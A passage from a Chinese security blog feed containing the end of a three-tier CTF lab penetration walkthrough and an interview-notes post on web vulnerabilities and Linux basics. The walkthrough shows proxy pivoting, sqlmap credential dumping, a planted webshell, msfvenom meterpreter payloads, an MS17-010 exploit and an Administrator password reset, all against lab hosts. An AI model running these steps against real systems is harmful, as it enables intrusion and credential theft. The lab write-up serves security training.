options</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png" alt><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vim /etc/proxychains.conf</span></span><br><span class="line">加入以下内容：</span><br><span class="line">socks4 192.168.1.113 2222</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png" alt><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 nmap -Pn -sT 192.168.22.22</span></span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png" alt></p><h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png" alt><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png" alt><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png" alt><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword --dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png" alt><br>5、看看bagecms下有哪些表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png" alt><br>6、看一下bage_admin下的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms -T bage_admin --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png" alt><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms -T bage_admin -C username,password --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png" alt><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png" alt><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png" alt><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png" alt></p><h2 id="b、设置代理-1"><a href="#b、设置代理-1" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><p>1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf &gt; shell2.elf</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png" alt><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www:/www/wwwroot/upload) $ chmod 777 shell2.elf</span><br><span class="line">(www:/www/wwwroot/upload) $ ./shell2.elf</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png" alt></p><p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST 192.168.22.22</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4321</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png" alt><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png" alt><br>5、尝试扫描Target3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 nmap -Pn -sT 192.168.33.33</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png" alt></p><h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><h2 id="a、获取shell-2"><a href="#a、获取shell-2" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> RHOST 192.168.33.33</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png" alt></p><p>2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;net user</span><br><span class="line">C:\Windows\system32&gt;net user Administrator 123</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png" alt></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。<br>这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p><p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功<br>6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p><blockquote><p>参考文章：<br><a href="http://zerlong.com/512.html" target="_blank" rel="noopener">http://zerlong.com/512.html</a><br><a href="https://www.anquanke.com/post/id/170649" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170649</a><br><a href="https://www.anquanke.com/post/id/164525" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164525</a><br><a href="https://blog.csdn.net/qq_36711453/article/details/84977739" target="_blank" rel="noopener">https://blog.csdn.net/qq_36711453/article/details/84977739</a><br>这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。</p></blockquote><blockquote><p>本文首发地址：<a href="https://www.anquanke.com/post/id/187908" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187908</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发地址：&lt;a href=&quot;https://www.anquanke.com/post/id/187908&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/187908&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。&lt;/p&gt;
    
    </summary>
    
      <category term="实例演示" scheme="https://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
    
    
      <category term="内网渗透" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="CFS" scheme="https://www.teamssix.com/tags/CFS/"/>
    
      <category term="比赛" scheme="https://www.teamssix.com/tags/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>经过一场面试，我发现我还存在这些不足</title>
    <link href="https://www.teamssix.com/year/191014-090745.html"/>
    <id>https://www.teamssix.com/year/191014-090745.html</id>
    <published>2019-10-14T01:07:45.000Z</published>
    <updated>2019-11-02T12:23:44.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。</p><p>这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。</p><a id="more"></a><p>PS：</p><p>1、面试中有的问题现在已经记得不是很深刻了，所以我想起来多少就记录多少咯。</p><p>2、因为引用的文章内容都比较多，所以本文只提到了一些概念性的东西，关于每个知识点具体的详情有想看的小伙伴就自己在参考资料里面去找吧，嘿嘿 [狗头保命]</p><h1 id="0x01-SSRF和CSRF的概念以及区别"><a href="#0x01-SSRF和CSRF的概念以及区别" class="headerlink" title="0x01 SSRF和CSRF的概念以及区别"></a>0x01 SSRF和CSRF的概念以及区别</h1><p>这个知识点就属于以前有了解，但是平时很少接触以至于遗忘的类型，同时在笔试的时候就有提到这个点，笔试结束后我还特意查了一下，但是面试的时候却没有答上来，有点尴尬，下面就引用CSDN和知乎里两篇文章的描述，此处引用的文章地址为本文参考资料1和2。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF又称跨站请求伪造，XSS就是CSRF中的一种。二者区别是XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。</p><p>简单来说，CSRF是通过第三方网站伪装成正常用户登录目标网站，并以正常用户的身份对用户账号进行操作，以达到目的，CSRF攻击原理流程如下图。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi1.png" alt></p><p>防御：</p><p>1、增加验证码机制，增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过。</p><p>2、验证referer,采用同源政策，referer记录着数据包的来源地址，来判断请求的合法性，但是这个可以伪造。</p><p>3、使用Token，令牌是一种将表单value的加密算法生成不同的加密结果，在服务器端进行验证。</p><p>4、在访问登录过一个网站，点击退出账户。</p><p>总结：</p><p>一次CSRF攻击成功实施，至少需要4个条件：</p><p>1、被害用户已经进行过WEB身份认证，并留有Cookie</p><p>2、新提交的请求无需重新进行身份认证或确认机制</p><p>3、攻击者了解WEB请求的参数构造</p><p>4、通过社交工程学诱使用户触发攻击的指令</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF又名服务端请求伪造攻击，如果把CSRF理解成客户端伪造请求攻击，它是利用用户本地的Cookie骗过服务器端的验证达到目的，而SSRF则是利用服务器天然能够访问内部网络的特点，进行攻击。</p><p>由此可以得出，SSRF的受害对象主要是一些服务器所连接的一些内网设备，如内网的应用程序，通过file协议获得内部网络的资料等。SSRF攻击常见于一些允许以URL作为参数，且未对URL进行过滤的服务器。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi2.png" alt></p><p>如上图，若URL是正常的第三方服务器，则URL会过滤通过。若URL是带有命令操作的服务器端A，且绕过了服务器端A的过滤，则服务器端A会执行URL带有的命令，并将结果返回会客户端，由此一次SSRF攻击成功。</p><p>防御：</p><p>从以上我们可以得出，该漏洞产生的原因是由于服务端对资源进行请求的时候对URL的验证出现了纰漏，所以我们的防护策略主要是围绕URL的过滤。</p><p>1、将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。</p><p>2、建立URL白名单，只允许白名单上内容通过过滤。</p><p>3、建立内网IP黑名单，阻止对该IP的请求。</p><p>4、对返回内容进行过滤，减少敏感内容暴露。</p><p>5、禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。</p><p>总结：</p><p>一次成功的SSRF需要2个条件：</p><p>1、攻击者知道服务器端的内网地址</p><p>2、服务器端未对请求URL进行过滤或过滤不完全</p><h1 id="0x02-SQL注入的类型以及防御"><a href="#0x02-SQL注入的类型以及防御" class="headerlink" title="0x02 SQL注入的类型以及防御"></a>0x02 SQL注入的类型以及防御</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>这里采用看雪的一篇文章，此处引用的文章地址为本文参考资料3。</p><p>1、常见的sql注入按照参数类型可分为两种：数字型和字符型。</p><p>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p><p>2、也可以根据数据库返回的结果，分为三种：回显注入、报错注入、盲注。</p><p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p><p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p><p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p><p>3、按照注入位置及方式不同分为以下几种：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>这里采用知乎上的一个问答，此处引用的文章地址为本文参考资料4。</p><p>问：</p><p>如何从根本上防止 SQL 注入？</p><p>SQL注入导致的安全问题数不胜数，为什么这么多年来同样的问题一再发生？</p><p>如果是因为SQL脚本拼接的原因，为什么不在新的实现中采用api调用的方式来杜绝漏洞？</p><p>答：</p><p>SQL注入并不是一个在SQL内不可解决的问题，这种攻击方式的存在也不能完全归咎于SQL这种语言，因为注入的问题而放弃SQL这种方式也是因噎废食。首先先说一个我在其他回答中也曾提到过的观点：<strong>没有（运行时）编译，就没有注入。</strong></p><p>SQL注入产生的原因，和栈溢出、XSS等很多其他的攻击方法类似，就是未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。针对于SQL注入，则是用户提交的数据，被数据库系统编译而产生了开发者预期之外的动作。也就是，SQL注入是用户输入的数据，在拼接SQL语句的过程中，超越了数据本身，成为了SQL语句查询逻辑的一部分，然后这样被拼接出来的SQL语句被数据库执行，产生了开发者预期之外的动作。</p><p>所以从根本上防止上述类型攻击的手段，还是避免数据变成代码被执行，时刻分清代码和数据的界限。而具体到SQL注入来说，被执行的恶意代码是通过数据库的SQL解释引擎编译得到的，所以只要<strong>避免用户输入的数据被数据库系统编译</strong>就可以了。</p><p>至于如何避免用户输入的数据被数据库系统编译，我觉着可以参考CSDN上的一篇文章，详见本文参考资料5，该文具体说了以下内容：</p><p>1、escape处理</p><p>2、使用预编译语句</p><p>3、使用存储过程</p><p>4、检查数据类型</p><p>5、使用安全函数</p><h1 id="0x03-XXE攻击的概念"><a href="#0x03-XXE攻击的概念" class="headerlink" title="0x03 XXE攻击的概念"></a>0x03 XXE攻击的概念</h1><p>这个我不确定当时面试有没有问，不过刚才突然想到了，而且自己对XXE攻击也不是很了解，所以就简单记一下吧，此处引用的文章地址为本文参考资料6。</p><p>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。</p><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体根据引用方式，还可分为内部实体与外部实体，xxe漏洞主要是利用了DTD引用外部实体导致的漏洞。</p><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。如果是linux下，可以读取/etc/passwd等目录下敏感数据。</p><p>XXE的漏洞检测：</p><p>1、检测XML是否会被成功解析</p><p>2、检测服务器是否支持DTD引用外部实体，如果支持引用外部实体，那么很有可能是存在xxe漏洞的。</p><p>XXE的修复与防御：</p><p>1、使用开发语言提供的禁用外部实体的方法</p><p>2、过滤用户提交的XML数据</p><h1 id="0x04-DDOS的类型"><a href="#0x04-DDOS的类型" class="headerlink" title="0x04 DDOS的类型"></a>0x04 DDOS的类型</h1><p>说到DDOS，我的第一反应就是TCP SYN泛洪攻击，对于其他的类型却了解很少，所以这里也同样记录一下，此处引用的文章地址为本文参考资料7。</p><p>首先有两类最常见的 DDoS 攻击，一是资源耗尽型；二是导致异常型，接下来就概要的说一下。</p><p>1、SYN Flood攻击即洪水攻击是通过TCP建立3次握手连接的漏洞产生，主要通过发送源IP虚假的SYN报文，使目标主机无法与其完成3次握手，因而占满系统的协议栈队列，致使资源得不到释放，进而达成拒绝服务的目的，SYN Flood攻击是移动互联网中DDoS攻击最主要的形式之一。</p><p>2、ACK Flood是对虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如SYN Flood。属于原始方式的DDoS攻击。 </p><p>3、UDP Flood是使用原始套接字伪造大量虚假源IP的UDP包，主要以DNS协议为主。 </p><p>4、ICMP Flood 即Ping攻击，是一种比较古老的方式。</p><p>5、CC攻击即ChallengeCollapsar挑战黑洞，主要通过大量的肉鸡或者寻找匿名代理服务器，模拟真实的用户向目标发起大量的访问请求，导致消耗掉大量的并发资源，使网站打开速度慢或拒绝服务。现阶段CC攻击是应用层攻击方式之一。 </p><p>6、DNS Flood主要是伪造海量的DNS请求，用于掩盖目标的DNS服务器。 </p><p>7、慢速连接攻击是针对HTTP协议，以slowloris攻击为起源，然后建立HTTP连接，设置一个较大的传输长度，实际每次发送很少字节，让服务器认为HTTP头部没有传输完成，因此数据传输越多就会造成连接资源耗尽。 </p><p>8、DOS攻击利用一些服务器程序的bug、安全漏洞、和架构性缺陷，然后通过构造畸形请求发送给服务器，服务器因不能判断处理恶意请求而瘫痪，造成拒绝服务。 </p><h1 id="0x05-跨域请求的概念"><a href="#0x05-跨域请求的概念" class="headerlink" title="0x05 跨域请求的概念"></a>0x05 跨域请求的概念</h1><p>以前记得在哪里有看到过这个，但是现在已经忘的差不多了，因此再复习复习，此处引用的文章地址为本文参考资料8。</p><p>同源是指相同的协议、域名、端口，三者都相同才属于同源。同源策略浏览器出于安全考虑，在全局层面禁止了页面加载或执行与自身来源不同的域的任何脚本，站外其他来源的脚本同页面的交互则被严格限制。</p><p>跨域由于浏览器同源策略，凡是发送请求url的协议、域名、端口三者之间任意一与当前页面地址不同即为跨域。</p><p>看看哪些情况下属于跨域访问：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png" alt></p><h1 id="0x06-Linux的日志文件位置"><a href="#0x06-Linux的日志文件位置" class="headerlink" title="0x06 Linux的日志文件位置"></a>0x06 Linux的日志文件位置</h1><p>讲道理，在面试前几天我在搭建一个三层靶机的环境，当时还查过Linux的日志文件位置的文章，但是在面试的时候却忘掉了，这就有点难受了，所以再记录一下吧，此处引用的文章地址为本文参考资料9。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/var/log/messages   ：常规日志消息</span><br><span class="line">/var/log/boot       ：系统启动日志</span><br><span class="line">/var/log/debug      ：调试日志消息</span><br><span class="line">/var/log/auth.log   ：用户登录和身份验证日志</span><br><span class="line">/var/log/daemon.log ：运行squid，ntpd等其他日志消息到这个文件</span><br><span class="line">/var/log/dmesg      ：Linux内核环缓存日志</span><br><span class="line">/var/log/dpkg.log   ：所有二进制包日志都包括程序包安装和其他信息</span><br><span class="line">/var/log/faillog    ：用户登录日志文件失败</span><br><span class="line">/var/log/kern.log   ：内核日志文件</span><br><span class="line">/var/log/lpr.log    ：打印机日志文件</span><br><span class="line">/var/log/mail.*     ：所有邮件服务器消息日志文件</span><br><span class="line">/var/log/mysql.*    ：MySQL服务器日志文件</span><br><span class="line">/var/log/user.log   ：所有用户级日志</span><br><span class="line">/var/log/xorg.0.log ：X.org日志文件</span><br><span class="line">/var/log/apache2/*  ：Apache Web服务器日志文件目录</span><br><span class="line">/var/log/lighttpd/* ：Lighttpd Web服务器日志文件目录</span><br><span class="line">/var/log/fsck/*     ：fsck命令日志</span><br><span class="line">/var/log/apport.log ：应用程序崩溃报告/日志文件</span><br><span class="line">/var/log/syslog     ：系统日志</span><br><span class="line">/var/log/ufw        ：ufw防火墙日志</span><br><span class="line">/var/log/gufw       ：gufw防火墙日志</span><br></pre></td></tr></table></figure><h1 id="0x07-Linux的各目录含义"><a href="#0x07-Linux的各目录含义" class="headerlink" title="0x07 Linux的各目录含义"></a>0x07 Linux的各目录含义</h1><p>这个是以前大一大二的时候学的了，现在只记住了平时经常用的那几个目录，所以当时感觉回答的并不是很好，因此这里也简单记录一下，此处引用的文章地址为本文参考资料10。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/bin   重要的二进制 (binary) 应用程序</span><br><span class="line">/boot  启动 (boot) 配置文件</span><br><span class="line">/dev   设备 (device) 文件</span><br><span class="line">/etc   配置文件、启动脚本等 (etc)</span><br><span class="line">/home  本地用户主 (home) 目录</span><br><span class="line">/lib   系统库 (libraries) 文件</span><br><span class="line">/media 挂载可移动介质 (media)</span><br><span class="line">/mnt   挂载 (mounted) 文件系统</span><br><span class="line">/opt   提供一个供可选的 (optional) 应用程序安装目录</span><br><span class="line">/proc  特殊的动态目录</span><br><span class="line">/root  root (root) 用户主文件夹，读作“slash-root”</span><br><span class="line">/sbin  重要的系统二进制 (system binaries) 文件</span><br><span class="line">/srv   服务（serve）文件</span><br><span class="line">/sys   系统 (system) 文件</span><br><span class="line">/tmp   临时(temporary)文件</span><br><span class="line">/usr   包含绝大部分所有用户(users)都能访问的应用程序和文件</span><br><span class="line">/var   经常变化的(variable)文件，诸如日志或数据库等</span><br></pre></td></tr></table></figure><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><p>暂时印象较深的也就想到这些了，说实话，虽然看着这篇文章记下了很多东西，但是我感觉自己脑子里还是没有记住多少东西，这些东西还是要经常去用才能记得住呀，平时不去用不去碰真的太容易忘了。通过这次面试也认识到自己的很多不足，所以不管最后面试结果怎么样，自己有收获就好，毕竟就像新东方唐叔说的：能力的提升不在于你做了多少道题，而在于你做了多少总结。</p><p>我觉着这句话再衍生一下就是能力的提升在于总结两个字，也就是说我自己犯了这些错误，有没有去总结，如果总结又总结了多少？而我觉着这些总结正是单属于我自己的宝贵财富，好了，不瞎扯了，感觉马上都变成鸡汤了 [ 笑哭 ]</p><p>参考资料：</p><blockquote><p>1、<a href="https://zhuanlan.zhihu.com/p/28657325" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28657325</a><br>2、<a href="https://blog.csdn.net/pygain/article/details/52912521" target="_blank" rel="noopener">https://blog.csdn.net/pygain/article/details/52912521</a><br>3、<a href="https://www.kanxue.com/book-6-110.htm" target="_blank" rel="noopener">https://www.kanxue.com/book-6-110.htm</a><br>4、<a href="https://www.zhihu.com/question/22953267" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267</a><br>5、<a href="https://blog.csdn.net/hitwangpeng/article/details/45534787" target="_blank" rel="noopener">https://blog.csdn.net/hitwangpeng/article/details/45534787</a><br>6、<a href="https://thief.one/2017/06/20/1/" target="_blank" 